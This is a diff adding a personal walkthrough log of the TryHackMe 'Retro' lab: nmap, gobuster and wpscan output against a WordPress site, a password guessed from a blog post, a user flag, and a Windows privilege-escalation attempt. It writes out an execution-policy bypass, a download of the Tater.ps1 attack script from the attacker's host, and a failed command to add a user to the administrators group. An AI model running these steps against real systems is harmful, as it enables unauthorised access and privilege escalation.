@@ -1,0 +1,299 @@
+┌──────────────────────────────────────────────────────────────┐
+│   ______                          ____          _         __ │
+│  / ____/_____ ___   ___   ____   / __ \ ____   (_)____   / /_│
+│ / / __ / ___// _ \ / _ \ / __ \ / /_/ // __ \ / // __ \ / __/│
+│/ /_/ // /   /  __//  __// / / // ____// /_/ // // / / // /_  │
+│\____//_/    \___/ \___//_/ /_//_/     \____//_//_/ /_/ \__/  │
+│                                                              │
+└──────────────────────────────────────────────────────────────┘
+┌──(kali㉿kali)-[~]
+└─$ Documents/TryHackMe/Retro 
+                                                                                                                  
+┌──(kali㉿kali)-[~/Documents/TryHackMe/Retro]
+└─$ nmap -sC -sV -Pn 10.10.249.68 -oN nmap
+Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-18 17:11 EST
+Nmap scan report for 10.10.249.68
+Host is up (0.16s latency).
+Not shown: 998 filtered tcp ports (no-response)
+PORT     STATE SERVICE       VERSION
+80/tcp   open  http          Microsoft IIS httpd 10.0
+|_http-title: IIS Windows Server
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+| rdp-ntlm-info: 
+|   Target_Name: RETROWEB
+|   NetBIOS_Domain_Name: RETROWEB
+|   NetBIOS_Computer_Name: RETROWEB
+|   DNS_Domain_Name: RetroWeb
+|   DNS_Computer_Name: RetroWeb
+|   Product_Version: 10.0.14393
+|_  System_Time: 2021-12-18T22:12:17+00:00
+| ssl-cert: Subject: commonName=RetroWeb
+| Not valid before: 2021-12-17T22:10:48
+|_Not valid after:  2022-06-18T22:10:48
+|_ssl-date: 2021-12-18T22:12:19+00:00; +20s from scanner time.
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 20s, deviation: 0s, median: 19s
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 31.19 seconds
+
+┌──(kali㉿kali)-[~/Documents/TryHackMe/Retro]
+└─$ gobuster dir -u http://10.10.249.68/ -w /usr/share/dirb/wordlists/common.txt -o gobuster
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.249.68/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Timeout:                 10s
+===============================================================
+2021/12/18 17:11:47 Starting gobuster in directory enumeration mode
+===============================================================
+                              
+===============================================================
+2021/12/18 17:13:11 Finished
+===============================================================
+
+┌──(kali㉿kali)-[~/Documents/TryHackMe/Retro]
+└─$ gobuster dir -u http://10.10.249.68/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -o gobuster 
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.249.68/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Timeout:                 10s
+===============================================================
+2021/12/18 17:13:45 Starting gobuster in directory enumeration mode
+===============================================================
+/retro                (Status: 301) [Size: 149] [--> http://10.10.249.68/retro/]
+/Retro                (Status: 301) [Size: 149] [--> http://10.10.249.68/Retro/][[3~
+                                                                                
+===============================================================
+2021/12/18 18:17:31 Finished
+===============================================================
+
+┌──(kali㉿kali)-[~/Documents/TryHackMe/Retro]
+└─$ gobuster dir -u http://10.10.249.68/retro -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -o retro_gobuster
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.249.68/retro
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Timeout:                 10s
+===============================================================
+2021/12/18 17:36:00 Starting gobuster in directory enumeration mode
+===============================================================
+/wp-content           (Status: 301) [Size: 160] [--> http://10.10.249.68/retro/wp-content/]
+/wp-includes          (Status: 301) [Size: 161] [--> http://10.10.249.68/retro/wp-includes/]
+/wp-admin             (Status: 301) [Size: 158] [--> http://10.10.249.68/retro/wp-admin/]   
+                                                                                            
+===============================================================
+2021/12/18 18:37:21 Finished
+===============================================================
+
+┌──(kali㉿kali)-[~/Documents/TryHackMe/Retro]
+└─$ wpscan -e vp,vt,dbe,cb,u --url http://10.10.249.68/retro                                                  4 ⨯
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.20
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[+] URL: http://10.10.249.68/retro/ [10.10.249.68]
+[+] Started: Sat Dec 18 17:22:08 2021
+
+Interesting Finding(s):
+
+[+] Headers
+ | Interesting Entries:
+ |  - Server: Microsoft-IIS/10.0
+ |  - X-Powered-By: PHP/7.1.29
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+[+] XML-RPC seems to be enabled: http://10.10.249.68/retro/xmlrpc.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | References:
+ |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
+
+[+] WordPress readme found: http://10.10.249.68/retro/readme.html
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] The external WP-Cron seems to be enabled: http://10.10.249.68/retro/wp-cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+[+] WordPress version 5.2.1 identified (Insecure, released on 2019-05-21).
+ | Found By: Rss Generator (Passive Detection)
+ |  - http://10.10.249.68/retro/index.php/feed/, <generator>https://wordpress.org/?v=5.2.1</generator>
+ |  - http://10.10.249.68/retro/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.2.1</generator>
+
+[+] WordPress theme in use: 90s-retro
+ | Location: http://10.10.249.68/retro/wp-content/themes/90s-retro/
+ | Latest Version: 1.4.10 (up to date)
+ | Last Updated: 2019-04-15T00:00:00.000Z
+ | Readme: http://10.10.249.68/retro/wp-content/themes/90s-retro/readme.txt
+ | Style URL: http://10.10.249.68/retro/wp-content/themes/90s-retro/style.css?ver=5.2.1
+ | Style Name: 90s Retro
+ | Style URI: https://organicthemes.com/retro-theme/
+ | Description: Have you ever wished your WordPress blog looked like an old Geocities site from the 90s!? Probably n...
+ | Author: Organic Themes
+ | Author URI: https://organicthemes.com
+ |
+ | Found By: Css Style In Homepage (Passive Detection)
+ |
+ | Version: 1.4.10 (80% confidence)
+ | Found By: Style (Passive Detection)
+ |  - http://10.10.249.68/retro/wp-content/themes/90s-retro/style.css?ver=5.2.1, Match: 'Version: 1.4.10'
+
+[+] Enumerating Vulnerable Plugins (via Passive Methods)
+
+[i] No plugins Found.
+
+[+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods)
+ Checking Known Locations - Time: 00:00:15 <==================================> (358 / 358) 100.00% Time: 00:00:15
+[+] Checking Theme Versions (via Passive and Aggressive Methods)
+
+[i] No themes Found.
+
+[+] Enumerating Config Backups (via Passive and Aggressive Methods)
+ Checking Config Backups - Time: 00:00:09 <===================================> (137 / 137) 100.00% Time: 00:00:09
+
+[i] No Config Backups Found.
+
+[+] Enumerating DB Exports (via Passive and Aggressive Methods)
+ Checking DB Exports - Time: 00:00:02 <=========================================> (71 / 71) 100.00% Time: 00:00:02
+
+[i] No DB Exports Found.
+
+[+] Enumerating Users (via Passive and Aggressive Methods)
+ Brute Forcing Author IDs - Time: 00:00:05 <====================================> (10 / 10) 100.00% Time: 00:00:05
+
+[i] User(s) Identified:
+
+[+] wade
+ | Found By: Author Posts - Author Pattern (Passive Detection)
+ | Confirmed By:
+ |  Wp Json Api (Aggressive Detection)
+ |   - http://10.10.249.68/retro/index.php/wp-json/wp/v2/users/?per_page=100&page=1
+ |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ |  Login Error Messages (Aggressive Detection)
+
+[+] Wade
+ | Found By: Rss Generator (Passive Detection)
+ | Confirmed By: Login Error Messages (Aggressive Detection)
+
+[!] No WPScan API Token given, as a result vulnerability data has not been output.
+[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
+
+[+] Finished: Sat Dec 18 17:23:06 2021
+[+] Requests Done: 621
+[+] Cached Requests: 8
+[+] Data Sent: 164.494 KB
+[+] Data Received: 315.596 KB
+[+] Memory used: 239.547 MB
+[+] Elapsed time: 00:00:57
+
+
+
+Ready Player One
+
+by Wade
+
+I can’t believe the movie based on my favorite book of all time is going to come out in a few days! Maybe it’s because my name is so similar to the main character, but I honestly feel a deep connection to the main character Wade. I keep mistyping the name of his avatar whenever I log in but I think I’ll eventually get it down. Either way, I’m really excited to see this movie! 
+
+> Google > Ready Player One Wade avatar > Parzival
+
+wade:parzival
+
+> RDP Port open so let's connect to that. On the desktop we have user.txt
+
+3b99fbdc6d430bfb51c72c651a261927
+
+
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Users\Wade>icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
+C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup RETROWEB\Administrator:(I)(OI)(CI)(DE,DC)
+                                                             NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
+                                                             BUILTIN\Administrators:(I)(OI)(CI)(F)
+                                                             BUILTIN\Users:(I)(OI)(CI)(RX)
+                                                             Everyone:(I)(OI)(CI)(RX)
+
+Successfully processed 1 files; Failed processing 0 files
+
+C:\Users\Wade>powershell.exe -nop -ep bypass
+Windows PowerShell
+Copyright (C) 2016 Microsoft Corporation. All rights reserved.
+
+PS C:\Users\Wade> Invoke-WebRequest -Uri 'http://10.6.121.137:8000/Tater.ps1' -OutFile Tater1.ps1
+PS C:\Users\Wade> dir
+
+
+    Directory: C:\Users\Wade
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-r---        12/8/2019   4:33 PM                Contacts
+d-r---        12/8/2019   8:09 PM                Desktop
+d-r---        12/8/2019   4:33 PM                Documents
+d-r---        12/8/2019   4:33 PM                Downloads
+d-r---        12/8/2019   4:33 PM                Favorites
+d-r---        12/8/2019   4:33 PM                Links
+d-r---        12/8/2019   4:33 PM                Music
+d-r---        12/8/2019   5:02 PM                Pictures
+d-r---        12/8/2019   4:33 PM                Saved Games
+d-r---        12/8/2019   4:33 PM                Searches
+d-r---        12/8/2019   4:33 PM                Videos
+-a----       12/18/2021   2:45 PM          76641 Tater1.ps1
+
+
+PS C:\Users\Wade> .\Tater1.ps1
+PS C:\Users\Wade> Invoke-Tater -Trigger 1 -Command "net localgroup administrators user /add"
+Invoke-Tater : The term 'Invoke-Tater' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the
+spelling of the name, or if a path was included, verify that the path is correct and try again.
+At line:1 char:1
++ Invoke-Tater -Trigger 1 -Command "net localgroup administrators user  ...
++ ~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (Invoke-Tater:String) [], CommandNotFoundException
+    + FullyQualifiedErrorId : CommandNotFoundException
+
+PS C:\Users\Wade>
